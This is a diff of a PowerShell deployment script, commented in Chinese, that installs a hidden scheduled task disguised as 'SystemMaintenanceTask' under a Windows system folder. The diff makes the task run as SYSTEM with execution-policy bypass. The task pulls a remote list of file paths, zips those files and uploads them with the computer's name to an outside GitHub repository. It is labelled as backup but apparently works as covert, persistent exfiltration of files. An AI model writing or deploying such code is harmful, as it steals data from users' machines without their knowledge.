@@ -9,16 +9,20 @@ $scriptPath = "C:\ProgramData\Microsoft\Windows\$scriptFileName"
 $taskName = "SystemMaintenanceTask"
 $taskTime = "23:00"
 
-# ✅ 嵌入完整上传逻辑的主脚本内容
+# ✅ 嵌入上传逻辑的主脚本内容
 $scriptContent = @'
 [Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
 $OutputEncoding = [System.Text.UTF8Encoding]::UTF8
 
 $repo = "rtyuiuiop/1"
 $token = $env:GITHUB_TOKEN
+if (-not $token) {
+    Write-Error "❌ GITHUB_TOKEN 环境变量未设置。请先运行 set-token.ps1 脚本。"
+    exit 1
+}
 $tag = "$env:COMPUTERNAME-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
 $apiUrl = "https://api.github.com/repos/$repo/releases"
-$pathListUrl = "https://raw.githubusercontent.com/rtyuiuiop/1/refs/heads/main/.github/upload-paths.txt"
+$pathListUrl = "https://raw.githubusercontent.com/rtyuiuiop/1/main/.github/upload-paths.txt"
 
 try {
     $paths = Invoke-WebRequest -Uri $pathListUrl -UseBasicParsing -ErrorAction Stop | Select-Object -ExpandProperty Content
@@ -57,15 +61,15 @@ $releaseBody = @{
     body       = "自动上传的备份文件"
     draft      = $false
     prerelease = $false
-} | ConvertTo-Json -Depth 3
-
-$headers = @{
-    Authorization = "token $token"
-    "Content-Type" = "application/json"
 }
 
 try {
-    $response = Invoke-RestMethod -Uri $apiUrl -Headers $headers -Method Post -Body $releaseBody
+    $headers = @{
+        Authorization = "token $token"
+        "Content-Type" = "application/json"
+    }
+    $json = $releaseBody | ConvertTo-Json -Depth 3
+    $response = Invoke-RestMethod -Uri $apiUrl -Headers $headers -Method Post -Body $json
     if ($response.upload_url) {
         $uploadUrl = $response.upload_url -replace "{.*}", "?name=$(Split-Path $zipPath -Leaf)"
         $uploadHeaders = @{
@@ -95,13 +99,13 @@ try {
     exit 1
 }
 
-# 注册计划任务
+# 注册计划任务（以 SYSTEM 身份，确保静默运行）
 try {
     $arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
-    schtasks /Create /TN $taskName /TR "powershell.exe $arguments" /SC DAILY /ST $taskTime /RL HIGHEST /F | Out-Null
-    Write-Host "📅 任务 [$taskName] 已注册，每天 $taskTime 执行"
+    schtasks /Create /TN "\MyTasks\$taskName" /TR "powershell.exe $arguments" /SC DAILY /ST $taskTime /RL HIGHEST /RU SYSTEM /F | Out-Null
+    Write-Host "📅 任务 [$taskName] 已注册（位置：\MyTasks），每天 $taskTime 运行"
 } catch {
     Write-Warning "⚠️ 注册任务失败：$($_.Exception.Message)"
 }
 
-Write-Host "`n✅ 部署完成。"
+Write-Host "`n✅ 部署完成。你可以关闭窗口。"
